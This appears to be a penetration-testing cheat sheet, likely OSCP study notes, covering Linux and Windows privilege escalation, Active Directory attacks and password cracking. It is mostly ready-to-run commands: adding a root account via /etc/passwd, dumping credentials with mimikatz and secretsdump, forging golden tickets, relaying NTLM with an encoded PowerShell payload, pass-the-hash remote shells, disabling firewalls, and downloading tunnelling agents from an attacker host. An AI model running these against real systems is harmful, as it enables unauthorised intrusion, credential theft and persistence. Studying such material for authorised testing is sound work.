netsh advfirewall firewall show rule name=all
```







```
### Have a rdp window, use it to change to admin
runas /user:backupadmin cmd		# might need to bypass UAC

evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```



### Linux PE

#### 1. Basic Enumeration

check user & group

```shell
whoami
id
hostname
groups		# check any non-standard group
cat /etc/passwd

groups username		# reqire admin priv
```



#### 2. Sudo

```
sudo -l
```



```
sudo -V
	- 1.8.31	https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main
```



#### 3. IP Address & Network

```
ifconfig
ip a		# display all info
ip addr

route
routel

netstat -ano 
ss -anp
ss -tunlp
```



#### 4. Common Directory

```shell
/
/home
/root

/home/user/.bash_history
history
env

find / -type d -name ".git" 2>/dev/null
```



#### 5. Firewall

```
ls -al /etc/iptables
cat /etc/iptables/rules.v4
```



#### 6. Running Process

```
ps aux
ps -ef -w -f

watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```



#### 7. Installed Application

- debian-based Linux`dpkg -l`
- red hat-based Linux `rpm`



`sudo ` version





#### 8. Scheduled Task

```shell
/etc/cron*
/etc/crontab			# The system-wide crontab file

crontab -l
sudo crontab -u username -l		# root user

grep "-i CRON" /var/log/cron.log
grep "CRON" /var/log/syslog

ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```





#### 9. Files with Insecure Permission

1. writable directories

   ```
   find / -writable -type d 2>/dev/null
   ```

2. if have write access for `/etc/passwd`

   ```shell
   joe@debian-privesc:~$ openssl passwd w00t
   Fdzt.eqJQ4s0g
   
   joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
   
   joe@debian-privesc:~$ su root2
   Password: w00t
   
   root@debian-privesc:/home/joe# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

   

3. if have read access for`/etc/shadow` - bruteforce hash

   ```shell
   unshadow /etc/passwd /etc/shadow > output.db
   
   # look for the encryption method
   grep ENCRYPT_METHOD /etc/login.defs
   
   john output.db
   john -w /path/to/wordlist — format=md5crypt hashes
       $1 = MD5 hashing algorithm.
       $2 =Blowfish Algorithm is in use.
       $2a=eksblowfish Algorithm
       $5 =SHA-256 Algorithm
       $6 =SHA-512 Algorithm
      
   hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```

   

4. if we have modified `/etc/sudoers`

   - add `haris ALL=(ALL) NOPASSWD:ALL` 
   - `sudo -i`

   



#### 10. SUID & Capabilities

- SUID

  ```shell
  find / -perm -u=s -type f 2>/dev/null
  find / -user root -perm -u=s 2>/dev/null
  	- screen-4.5.0 SUID
  ```

  

- Capability

  ```shell
  getcap -r / 2>/dev/null
  /usr/sbin/getcap -r / 2>/dev/null
  ```

  

#### 11. Kernel

OS Version & Architecture

```
cat /etc/issue
cat /etc/*-release
uname -a
arch

aa-status		# check AppArmor Policy - require admin Privilege
```



**Known Vuln**

- DirtyPipe - https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits 
  - ubuntu 20.04 | 21.04
  - Linux kernel versions newer than 5.8 are affected.
  - So far the vulnerability has been patched in the following Linux kernel versions:
    - 5.16.11
    - 5.15.25
    - 5.10.102



#### 12. Automated

- linPEAS.sh

  ```
  linpeas.sh
  ```

  - check backup files / folders

- unix-privesc-check

  ```
  ./unix-privesc-check standard
  ./unix-privesc-check detailed
  ```




#### 13. Misc

Drive & Kernel Module

```
mount		# list all mounted file system
/etc/fstab	# all drives that will be mounted at boot time
lsblk		# view all available tasks
			# some of the partitions might not be mounted, can mount some partitions and search for interesting files
lomod		# loaded kernel modules
/sbin/modinfo xxx	# find out more about the specific module
```



Pspy

Unprivileged Linux Process Snooping





### Win POST-Enum/Exp

1. enumerate user & group & domain

2. ```
   Get-ChildItem -Path C:\ -Include SAM, SYSTEM -File -Recurse -ErrorAction SilentlyContinue
   
   impacket-secretsdump -sam SAM -system SYSTEM LOCAL
   ```

   

2. History

   ```
   Get-History
   (Get-PSReadlineOption).HistorySavePath
   ```
   
   
   
2. `mimikatz` - collect hash

   ```
   ::		# check command
   xxxx::
   	lsdump::
   
   privilege::debug
   token::elevate
   
   sekurlsa::logonpasswords
   lsadump::sam		# dumps the Security Account Manager (SAM) database, which is where Windows stores users' hashed passwords locally.
   
   lsadump::secerts	# dumps the secrets stored in the LSA (Local Security Authority)
   
   lsadump::cache		#  dumps the cache of logon credentials that is maintained for disconnected operations like logging in while there is no connection to the domain controller
   
   lsadump::lsa /patch
   ```
   
   bruteforce NTLM hash
   
   ```
   hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
   
   rules
   	/usr/share/hashcat/rules/best64.rule
   	/usr/share/hashcat/rules/rockyou-30000.rule
   
   wordlists
   	/usr/share/wordlists/rockyou.tx
   	/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
   	/usr/share/john/password.lst
   ```
   
   
   
5. run `linPEAS` again once have administrator access



Enable RDP

```
# changes a Windows Registry value to enable Remote Desktop Connections
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Enable / Disable restricted Admin mode
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 1 /f

# Disable the Firewall For all Profies 
netsh advfirewall set allprofiles state off

# adds a specified user to the "remote desktop users" group
net user /add username password
net localgroup "remote desktop users" <USERNAME> /add
```



PowerView 3.0 Trick

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993











## Active Directory

### AD Enumeration

#### 1. Net User

```
net user /domain
net user xxx /domain
net group /domain
net group xxx /domain
```



#### 2. PowerView

PowerView 3.0 Trick

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

```
Import-Module .\PowerView.ps1
```

1. ```
   Get-NetDomain
   ```

2. list users in the domain

   ```
   Get-NetUser
   Get-NetUser | Select cn
   Get-NetUser | select cn,pwdlastset,lastlogon
   ```

   

3. Enumerate groups

   ```
   Get-NetGroup | select cn
   Get-NetGroup "Domain Admins" | select member
   ```

4. Enumerate Computer Objects

   ```
   Get-NetComputer
   Get-NetComputer | select operatingsystem,dnshostname
   ```

5. ```
   Find-LocalAdminAccess
   ```

6. obtain info such which users is logged in to which computer

   ```
   Get-NetSession -ComputerName files04
   Get-NetSession -ComputerName files04 -Verbose
   ```

7. enumerate spn

   ```
   Get-NetUser -SPN | select samaccountname,serviceprincipalname
   ```

8. explore domain shares

   ```
   Find-DomainShare
   net view \\dc01 /all
   ls \\dc1.corp.com\sysvol\corp.com\
   ```

9. Enumerate Object Permission

   @OCSP.md

   ```
   Get-ObjectAcl -Identity stephanie
   ```

   



#### 3. Bloodhound

```
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound

Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound --collectionmethod All,GPOLocalGroup,LoggedOn

sudo neo4j start
bloodhound
```

useful pre-built queries

```
- find all domain admins
- find shortest paths to domain admins
- find principals with DCSync Rights

- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

- List all Kerberoastable Accounts

```

Custom Queries

```
MATCH (m:Computer) RETURN m			# display all computers
MATCH (m:User) RETURN m				# display all User
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p			# Display all active sessions
```



### AD Authentication Attack

Get Hash

Kerberos Attacks Cheatsheet

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a



#### 1. AS-REP Roasting

1. Get Hash

   - Linux

     ```
     impacket-GetNPUsers -dc-ip 192.168.50.70 -request corp.com/pete
     
     impacket-GetNPUsers -dc-ip 192.168.50.70 -request corp.com/pete -format hashcat
     
     impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
     
     impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith
     ```

     

   - Windows

     ```
     .\Rubeus.exe asreproast /nowrap
     ```

2. Bruteforce

   ```
   sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
   ```

   

#### 2. Kerberoasting

1. Get TGS-REP hash

   - Linux

     ```
     impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
     impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -outputfile filename
     ```

     

   - Windows

     ```
     .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
     ```

     

2. Bruteforce

```shell
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```



#### 3. Silver Ticket

#### 4. DC sync

if user has these rights, can perform ***dcsync*** attack

- *Replicating Directory Changes*
- *Replicating Directory Changes All*
- *Replicating Directory Changes in Filtered Set*



1. Get NTLM Hash

   - Windows

     ```
     mimikatz # lsadump::dcsync /user:corp\dave
     ```

     

   - Linux

     ```
     impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.10.10.175
     
     impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
     
     impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
     ```

2. 

   1. Bruteuforce NTLM HaSH
   
      ```
      hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
      ```
   
   2. Choose the user with admin access, use its hash to get remote shell
   
      ```
      crackmapexec smb 10.10.10.175 -u administrator -H hash
      
      impacket-psexec domain/user@ip -H LMHash:NThash
      ```
      
      
   

#### 5. NTLMv2  Get Hash

obtain code execution or a shell on a Windows system as an unprivileged user

abuse the ***Net-NTLMv2 network authentication protocol***.

1. Kali: start *Responder* tool

   ```
   sudo responder -I <interface>
   ```

2. windows: non-privileged user

   ```
   dir \\<kali ip>\<non-existent SMB shares>
   ```

3. Responder will capture NTLMv2 hash

4. Bruteforce

   ```
   hashcat --help | grep -i "ntlm"		# 5600
   ```




#### 6. NTLMv2 Relay Hash

1. kali: 

   ```
   nc -lvnp xxxx
   ```

   

   ```
   sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
   ```

   

2. windows:

   ```
   //<kali ip>/<file>
   
   dir \\<kali ip>\<none-existent SMB share>
   ```




#### 7. Golden Ticket

1. retrieve `krbtgt` password hash

   ```
   mimikatz# lsadump::lsa /patch
   ```

2. forge and inject golden ticket

   ```
   mimikatz# kerberos::pruge
   
   kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
   ```

   - **kerberos::purge** - delete any existing Kerberos tickets before generating golden ticket
   - domain SID - check with `whoami /user`
   - **kerberos::golden** create the golden ticket
   - use the **/krbtgt** option instead of **/rc4** to indicate we are supplying the password hash of the *krbtgt* user account.
   - starting July 2022, we'll need to provide an existing account
   - `/ptt`: This command is used to inject the created ticket directly into the current session.

3. verify 

   ```
   # CMD
   PsExec.exe \\dc1 cmd.exe
   ```

   must use hostname to connect, or using NTLM hash



### AD Lateral Movement

Use password & hash to move to another target / PE



#### 1. Password Spray

```shell
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

crackmapexec winrm iplist -u 'web_svc' -p 'Diamond1' -d oscp.exam --continue-on-success

crackmapexec mssql iplist -u 'sql_svc' -p 'Dolphin1' -d oscp.exam --continue-on-success

--local-auth
```



```
hydra -l USER -p PASS rdp://<IP>
hydra -L USER.txt -P PASS.txt -M IPList rdp
```



#### 2. Pass the Hash

**WMI, WinRM, PsExec, Evil-winrm, RDP**

Use Password to Get Remote Shell

```
# Windows
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
winrs -r:IP -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

# Linux
evil-winrm -i 192.168.50.220 -u daveadmin -p "pass"
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

impacket-psexec domain/username@10.10.10.100
```

`wmic` -  DCOM (Distributed Component Object Model) protocol / port between 49162-65535 / 135

`winrs` & `evil-winrm` - Web Service Management protocol / tcp 5985

`impacket-psexec` - smb & rpc

`impacket-wmiexec` - Windows management instrumentation (WMI) & DCOM protocol





Use NTLM Hash to Get Remote Shell

```
impacket-psexec -hashes lmhash:nthash [[domain/]username[:password]@]<targetName or address> 

impacket-wmiexec -hashes lmhash:nthash [domain/]username@192.168.50.73
```



For psexec like

```
PsExec.exe \\dc1 cmd.exe
psexec.exe \\192.168.50.70 cmd.exe
```

use IP - NTLM authentication

use hostname - kerberos authenticaiotn



`wmic/winrm` -> `administrator`

`psexec` -> `system`



rdp 

> for win11 & non domain-joined machine, can only use `xfreerdp`

```
rdesktop 192.168.201.247  -u mark -p OathDeeplyReprieve91 -d relia.com

proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
xfreerdp /d:relia.com /v:192.168.201.247 /u:mark /p:OathDeeplyReprieve91 /cert:ignore
```



## Password Attacks

### General

```
hashcat --show

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

john --rules=best64 --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

```



#### Weak Credentials

Default Password: https://viperone.gitbook.io/pentest-everything/resources/cheat-sheets/default-passwords

```
admin:admin
<user>:<user>
admin:password
:password
product_name:product_name

# Username
	administrator
	user
	root
	mysql
	offsec
	
	
# Password
	password
	/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt		# 1300 lines
```

- When encounter an app that requires login, Google `<app name> default login` and try admin:admin, user:user, product_name:product_name

- When encounter any app

  - searchsploit
  - `<app name> GitHub exploit`
  - `hacktricks <app name>`
  - `<app name> exploit cve`

  

#### Wordlists

- General

  ```
  /usr/share/wordlists/rockyou.tx
  ```

- Discovery

  ```
  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
  ```

- Passwords

  ```
  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
  /usr/share/john/password.lst
  ```

- Use Hashcat to generate wordlists

  ```
  hashcat --stdout -r rule --force password.lst > pass.lst
  ```

  

#### Rules

- Hashcat

  ```
  -r /usr/share/hashcat/rules/best64.rule
  -r /usr/share/hashcat/rules/rockyou-30000.rule
  /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
  --rules=ssh.rule
  ```

  

- John the Ripper

  ```
  --rules=best64
  --rules=InsidePro-PasswordsPro.rule
  --rules=rockyou-30000
  
  ```
  
  

#### Identify Hash Type

```
hashid hash
hash-identifier hash
```



### Online

#### 1. SSH

```
hydra -l george -P <Wordlist> -s 2222 ssh://<IP>
	-s 				# port
hydra -l george -P <Wordlist> ssh://IP:PORT
```



#### 2. RDP

```
hydra -l USER -p PASS rdp://<IP>
hydra -L USER.txt -P PASS.txt -M IPList rdp
```



#### 3. HTTP POST Login

```
hydra -l user -P wordlist IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```



#### 4. HTTP htaccess attack

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```



### Offline

#### 1. Keepass .kdbx

1. search Keepass database file

   ```
   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
   ```

2. format the database file

   ```
   keepass2john Database.kdbx > keepass.hash
   ```

   remove the "Database:" string

3. crack

   ```
   hashcat --help | grep -i "KeePass"		# -i ignore case
   
   hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
   ```

4. open keepass with the cracked password, and have access to all the user's stored password

   - linux - `kpcli`

     ```
     kpcli --kdb=Database.kdbx
     
     ls & cd
     
     # show password
     show -f <number>
     ```

   - windows - use gui keepass



#### 2. Windows NTLM Hash

windows NTLM Hash, derived from `mimikatz`

```
hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

rules
	/usr/share/hashcat/rules/best64.rule
	/usr/share/hashcat/rules/rockyou-30000.rule

wordlists
	/usr/share/wordlists/rockyou.tx
	/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
	/usr/share/john/password.lst
```



#### 3. Linux Shadow Hash

```shell
unshadow /etc/passwd /etc/shadow > output.db

# look for the encryption method
grep ENCRYPT_METHOD /etc/login.defs

john output.db
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
	--rules=best64
	--rules=rockyou-30000

john -w /path/to/wordlist — format=md5crypt hashes
    $1 = MD5 hashing algorithm.
    $2 =Blowfish Algorithm is in use.
    $2a=eksblowfish Algorithm
    $5 =SHA-256 Algorithm
    $6 =SHA-512 Algorithm
```



#### 3. Zip Password

```
zip2john file.zip > zip.hashes
john zip.hashes
```



#### 4. SSH PrivateKey Passphrase

suppose id_rsa is protected by an unknown passphrase

1. transform the private key into a hash format for our cracking tools

   ```
   ssh2john id_rsa > ssh.hash
   ```

   remove the filename before the first colon / ADD `--username` option for hashcat

   

2. crack

   ```
   hashcat -h | grep -i "ssh
   
   hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
   ```

   

#### 5. GPP-Stored Password Hash

usually found in sth like `xxx.xml`, e.g. `Groups.xml`, `old-policy-backup.xml`

```
gpp-decrypt XXXhash
```



## Port Forwarding and Tunneling

### Ligolo

1. Kali: 

   1. create and enable the interface

      ```
      sudo ip tuntap add user kali mode tun ligolo
      sudo ip link set ligolo up
      ```

   2. add routing rules

      ```
      sudo ip route add 10.10.85.0/24 dev ligolo
      # sudo ip route del 10.10.85.0/24 dev ligolo scope link
      ip route list
      ```

   3. start ligolo

      ```
      ./ligolo-ng_proxy_0.4.3_linux64 -selfcert
      ```

      

2. Windows

   ```
   iwr -uri 192.168.45.195:8080/Tunnelling/ligolo-ng_agent_0.4.3_win64.exe -Outfile ligolo-ng_agent_0.4.3_win64.exe
   ```

   ```
   ligolo-ng_agent_0.4.3_win64.exe -connect 192.168.45.195:11601 -ignore-cert
   ```

3. Kali - ligolo

   ```
   session
   start
   ```



Create Listeners

- reverse shell

  ```
  listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
  listener_list
  ```

- upload file

  ```
  listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
  ```




Test Port Forwarding / Tunneling Quality

```shell
IP="10.10.136.152"; PORT=445; TIMEOUT=5;SLEEP=20;while true; do echo "================================="; date;timeout $TIMEOUT nc -nvz $IP $PORT || echo -e "no connection to $IP $PORT";sleep $SLEEP;done
```



### SSH



#### Local Port Forward

On kali

```
ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L <Local_IP/0.0.0.0>:<Local_Port>:<Remote_IP>:<Remote_Port> user@IP
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```



#### Remote Port Forward

```
ssh -N -R [bind_address:]port:host:hostport [username@address]
	- bind_address		# remote address
	- host				# local address/127.0.0.1/0.0.0.0

ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```



#### Dynamic Local Port Forwarding

```
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
```

```
proxychains4 xxx
```



#### Dynamic Remote Port Forwarding





### Chisel

```
iwr -uri http://192.168.45.170/Tools/Tunnelling/chisel_1.8.1_windows_amd64 -Outfile chisel_1.8.1_windows_amd64

powershell -c "iwr -uri http://192.168.45.170/Tools/Tunnelling/chisel_1.8.1_windows_amd64 -Outfile chisel_1.8.1_windows_amd64"
```



```
1. kali: chisel server -p 9999 --reverse
2. kali: modify proxychains entry - 9000
3. 121-win: chisel_1.8.1_windows_amd64 client 192.168.45.170:9999 R:9000:socks
4. kali: proxychains nmap localhost
```









upgrade shell

- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

- socat/pwncat
